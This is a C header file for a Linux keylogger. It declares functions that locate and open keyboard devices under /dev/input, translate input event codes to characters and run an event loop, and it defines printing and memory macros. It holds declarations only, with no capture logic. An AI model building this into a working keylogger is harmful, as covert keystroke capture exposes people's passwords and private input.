#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/input.h>

#ifndef bool
typedef unsigned char bool;
#endif

#ifndef safe_dup
#define safe_dup(str) strndup(str, strlen(str))
#endif

#ifndef join_path
#define join_path(dest, src) {                      \
	if(dest[strlen(dest)] != '/' && src[0] != '/')  \
		strncat(dest, "/", strlen("/"));            \
	strncat(dest, src, strlen(src));                \
}
#endif

#ifndef MIN_BUFFER_SIZE
#define MIN_BUFFER_SIZE 255
#endif

#ifndef MAX_BUFFER_SIZE
#define MAX_BUFFER_SIZE 1000
#endif


typedef enum _message_type {
	ERROR = 1,
	INFO,
	WARN,
	STATUS,
	NORMAL,
} MessageType ;


static inline
void PRINT(MessageType type, const char* fmt, ...)
{
	va_list args;
	va_start(args, fmt);
	switch(type)
	{
		case ERROR:
			printf("\033[91m[ERROR]\033[0m ");	
			break;
		case INFO:
			printf("\033[92m[INFO]\033[0m ");
			break;
		case WARN:
			printf("\033[93m[WARNING]\033[0m ");
			break;
		case STATUS:
			printf("\033[94m[STATUS]\033[0m ");
			break;
		case NORMAL:
			break;
	}

	vprintf(fmt, args);
	va_end (args);
}

#define ZERO(obj, size) {        \
	if(obj != NULL)              \
		bzero((void*)obj, size); \
}

#define MALLOC(obj, size, type) {                     \
 	obj = (type) malloc(size);                        \
 	if(obj == NULL)                                   \
 	{                                                 \
 		PRINT(ERROR, "cannot assign memory"); \
 		exit(1);                                      \
 	}                                                 \
 	ZERO(obj, size);                                  \
}

#define FREE(obj) {  \
	if(obj != NULL)  \
	{                \
		free(obj);   \
		obj = NULL;  \
	}                \
}

// device
#ifndef ROOT_DEVICES
#define ROOT_DEVICES "/dev/input"
#endif

typedef struct _defice {
	char* name;
	char* path;
	int   fd;
} Device ;

Device* new_device();
bool find_keyboard_device(Device** dst_device);
Device* open_device(const char* dev);
void destroy_device(Device** device);
bool is_keyboard_device(const Device** dev);
void close_device_handler(int status, void* device);


// events
#ifndef __u16
typedef unsigned short __u16;
#define __u16 __u16
#endif

#ifdef __u16
#define u16 __u16
#endif

char get_char_from_event_code(u16 code);
void print(const char c);
void event_loop(Device*);


#endif // KEYLOGGER_H